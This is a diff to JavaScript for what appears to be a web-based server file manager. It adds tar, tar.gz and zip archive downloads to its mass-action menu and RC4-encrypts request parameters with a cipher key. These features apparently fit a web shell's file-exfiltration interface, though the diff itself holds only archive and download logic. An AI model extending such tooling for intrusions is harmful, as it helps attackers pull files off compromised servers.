@@ -482,8 +482,7 @@ function mass_act(type){
 		}
 	}
 	else if((type=='compress (tar)')||(type=='compress (tar.gz)')||(type=='compress (zip)')){
-		var date = new Date();
-		var rand = date.getTime();
+		var rand = new Date().getTime();
 		var arcFilename;
 		if(type=='compress (tar)'){
 			arcType = 'tar';
@@ -510,9 +509,20 @@ function mass_act(type){
 			show_box(ucfirst(title), content);
 		}
 	}
-    else if(type==='download (zip)'){
-        arcType = 'download';
-        arcFilename = new Date().format('yyyyMMddhhmmssS')+'.zip';
+    else if((type==='download (tar)')||(type==='download (tar.gz)')||(type==='download (zip)')){
+        rand = new Date().format('yyyyMMddhhmmssS');
+        if(type=='download (tar)'){
+            arcType = 'dtar';
+            arcFilename = rand+'.tar';
+        }
+        else if(type=='download (tar.gz)'){
+            arcType = 'dtargz';
+            arcFilename = rand+'.tar.gz';
+        }
+        else if(type=='download (zip)'){
+            arcType = 'dzip';
+            arcFilename = rand+'.zip';
+        }
 
         if(buffer.length>0){
             massBuffer = '';
@@ -595,6 +605,7 @@ function mass_act_go(massType){
 	var massBuffer = $.trim($('.massBuffer').val());
     var massPath = get_cwd();
     var massValue = '';
+    var download = false;
 	if(massType=='paste'){
         var bufferLength = localStorage.getItem('bufferLength');
         var bufferAction = localStorage.getItem('bufferAction');
@@ -616,6 +627,11 @@ function mass_act_go(massType){
 	else if((massType=='tar')||(massType=='targz')||(massType=='zip')){
 		massValue = $('.massValue').val();
 	}
+    else if((massType=='dtar')||(massType=='dtargz')||(massType=='dzip')){
+        massValue = $('.massValue').val();
+        download = true;
+        massType = massType.substring(1);
+    }
 	else if((massType=='untar')||(massType=='untargz')||(massType=='unzip')||(massType=='download')){
 		massValue = $('.massValue').val();
 	}
@@ -625,7 +641,7 @@ function mass_act_go(massType){
     }
 
     var args = {massType:massType,massBuffer:massBuffer,massPath:massPath,massValue:massValue};
-    if(massType === 'download') {
+    if(download) {
         var params = $.param(args);
         var dz_token = bin2hex(rc4(window['cipher_key'], params));
 
